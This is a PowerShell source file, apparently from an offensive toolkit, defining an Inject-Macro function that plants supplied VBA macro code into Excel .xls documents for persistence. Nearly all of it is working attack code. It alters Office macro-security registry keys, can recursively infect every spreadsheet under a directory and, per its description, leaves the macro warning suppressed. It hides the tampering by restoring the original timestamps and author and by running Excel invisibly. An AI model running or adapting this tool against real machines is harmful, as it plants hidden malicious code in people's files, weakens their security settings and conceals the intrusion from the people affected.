function Inject-Macro {
<#
.SYNOPSIS

Inject VBA macro code into Excel documents.

Author: Brandan Geise (coldfusion)
License: MIT
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Injects the supplied VBA macro code into the specified '.xls' Excel document.

Ideally this would be used to establish a low level form of persistence.

If the '-Infect' flag is given, the supplied VBA macro code will be injected into all Excel documents in the specified '-Excel' directory path. 

The Excel 'Security' registry keys are not re-enabled on exit when the '-Infect' flag is given, which disables the 'Macros have been disabled.' warning. 

For clean up, all injected Excel documents' full paths are written to 'excel_inject.log'.

If the '-Clean' flag is given, the 'excel_inject.log' file must be in the same directory as Inject-Macro.ps1.

The VBA macro code will be removed from the injected Excel documents and re-enable the registery keys.

.PARAMETER Excel

Path of the target Excel document or directory path.

.PARAMETER Macro

Path of the VBA macro file you want injected into the Excel documents.

.PARAMETER Infect

Inject VBA macro code into all '.xls' Excel documents found in the specified '-Excel' directory.

.PARAMETER Clean

Removes the VBA macro code from all Excel documents that were injected with the '-Infect' flag. 

.EXAMPLE

C:\PS> Inject-Macro -Excel C:\Users\Test\Excel.xls -Macro C:\temp\Macro.vba

Description
-----------
Injects the VBA macro 'Macro.vba' into the Excel document 'Excel.xls'

.EXAMPLE

C:\PS> Inject-Macro -Excel C:\Users\ -Macro C:\temp\Macro.vba -Infect

Description
-----------
Injects the VBA macro 'Macro.vba' into all '.xls' Excel documents found in 'C:\Users\' recursively.

.EXAMPLE

C:\PS> Inject-Macro -Clean

Description
-----------
Removes the VBA macro from all '.xls' injected Excel documents found in 'excel_inject.log'.
#>

[CmdletBinding()] Param(
	[Parameter(Mandatory = $False)]
	[String]
	$Excel,

	[Parameter(Mandatory = $False)]
	[String]
	$Macro,

	[Parameter(Mandatory = $False)]
	[Switch]
	$Infect = $False,

	[Parameter(Mandatory = $False)]
	[Switch]
	$Clean = $False
)

	# Inject macro into single Excel document
	function Local:Inject-One ([String] $Excel, [String] $Macro) {
		if ((Test-Path $Excel -pathType container) -eq $False) {
			$Output = $Excel
			$Workbook = $XLS.Workbooks.Open($Excel)
			$VBA = $Workbook.VBProject.VBComponents.Add(1)
			$VBA.CodeModule.AddFromFile($Macro) | Out-Null

			# Sanatize document metadata
			$RemoveMetadata = 'Microsoft.Office.Interop.Excel.XlRemoveDocInfoType' -as [type]
			$Workbook.RemoveDocumentInformation($RemoveMetadata::xlRDIAll) 

			# Save the document
			$Workbook.SaveAs("$Output", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
			$XLS.Workbooks.Close()

			# Enable macro security
			New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
			New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

			Write-Host "Macro sucessfully injected into $Output"
		} else {
			Write-Host 'Please provide a valid Excel file!' -foregroundcolor red
			break
		}
		Write-Warning 'Remember, the injected VBA macro is NOT password protected!'
	}

	# Inject macro into multiple Excel documents
	function Local:Inject-Many ([String] $Excel, [String] $Macro) {
		if ((Test-Path $Excel -pathType container) -eq $True) {
			Write-Host 'Infecting...'
			$ExcelFiles = Get-ChildItem -Path $Excel -include *.xls -recurse

			ForEach ($ExcelFile in $ExcelFiles) {
				try {
					$Output = $ExcelFile

					# Get original document metadata
					$LAT = $($(Get-Item $ExcelFile).LastAccessTime).ToString('M/d/yyyy h:m tt')
					$LWT = $($(Get-Item $ExcelFile).LastWriteTime).ToString('M/d/yyyy h:m tt')

					# Try to open Excel document with bad password (for password protected documents)
					$Workbook = $XLS.Workbooks.Open($ExcelFile, $Null, $Null, 1, "")
					$Author = $Workbook.Author
					$VBA = $Workbook.VBProject.VBComponents.Add(1)
					$VBA.CodeModule.AddFromFile($Macro) | Out-Null

					# Save the document
					$Workbook.Author = $Author
					$Workbook.SaveAs("$Output", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
					$XLS.Workbooks.Close()

					# Re-write original document metadata
					$(Get-Item $ExcelFile).LastAccessTime = $LAT
					$(Get-Item $ExcelFile).LastWriteTime = $LWT

					# Write to file for clean up
					$ExcelFile | Add-Content 'excel_inject.log' 

					Write-Host "Macro sucessfully injected into $ExcelFile"
				} catch {
					continue
				}
			}
		} else {
			Write-Host 'Please provide a valid directory path!' -foregroundcolor red
			break
		}
		Write-Host 'Macro has been injected into all Excel documents' -foregroundcolor green
	}

	# Clean up for -Infect
	function Local:Clean {
		if ((Test-Path 'excel_inject.log' -pathType container) -eq $False) {
			Get-Content 'excel_inject.log' | Foreach-Object {
				$ExcelFile = $_

				# Get original document metadata
				$LAT = $($(Get-Item $ExcelFile).LastAccessTime).ToString('M/d/yyyy h:m tt')
				$LWT = $($(Get-Item $ExcelFile).LastWriteTime).ToString('M/d/yyyy h:m tt')

				$Workbook = $XLS.Workbooks.Open($ExcelFile)
				$Author = $Workbook.Author

				# Remove VBA macros
				ForEach ($Module in $Workbook.VBProject.VBComponents) {
					if ($Module.Name -Like "Module*") {
						$Workbook.VBProject.VBComponents.Remove($Module)
					}
				}

				# Save the document
				$Workbook.Author = $Author
				$Workbook.SaveAs("$ExcelFile", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
				$XLS.Workbooks.Close()

				# Re-write original document metadata
				$(Get-Item $ExcelFile).LastAccessTime = $LAT
				$(Get-Item $ExcelFile).LastWriteTime = $LWT

				Write-Host "Macro removed from $ExcelFile"
			}
				# Enable macro security
				New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
				New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

				Remove-Item 'excel_inject.log'
		} else {
			Write-Host 'Could not find excel_inject.log file!' -foregroundcolor red
			break
		}
		Write-Host 'Injected macros have been removed from all Excel documents' -foregroundcolor green
	}

	# Create Excel objects
	Add-Type -AssemblyName Microsoft.Office.Interop.Excel
	$XLS = New-Object -ComObject Excel.Application
	$ExcelVersion = $XLS.Version

	# Disable macro security, YES this is needed to inject the macro, (it gets re-enabled)
	New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
	New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

	$XLS.DisplayAlerts = 'wdAlertsNone'
	$XLS.DisplayAlerts = $False
	$XLS.Visible = $False
	$XLS.ScreenUpdating = $False
	$XLS.UserControl = $False
	$XLS.Interactive = $False

	if ($PSBoundParameters['Infect']) {
		Inject-Many (Resolve-Path $Excel).Path (Resolve-Path $Macro).Path
	} elseif ($PSBoundParameters['Clean']) {
		Clean
	} else {
		Inject-One (Resolve-Path $Excel).Path (Resolve-Path $Macro).Path
	}

	# Clean up before exiting
	try {
		$XLS.Quit()
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($XLS) | out-null
		$XLS = $Null
	} catch {
		continue
	}
	
	if (ps excel) {
		kill -name excel
	}
}
